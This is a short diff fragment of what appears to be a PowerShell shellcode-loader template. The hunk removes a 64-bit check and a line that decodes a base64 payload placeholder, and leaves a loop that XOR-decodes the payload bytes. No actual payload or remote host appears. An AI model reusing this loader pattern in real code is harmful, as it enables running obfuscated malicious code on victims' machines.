@@ -20,8 +20,6 @@ function func_get_delegate_type {
 	return $var_type_builder.CreateType()
 }
 
-If ([IntPtr]::size -eq 8) {
-	[Byte[]]$var_code = [System.Convert]::FromBase64String('%%DATA%%')
 
 	for ($x = 0; $x -lt $var_code.Count; $x++) {
 		$var_code[$x] = $var_code[$x] -bxor 35
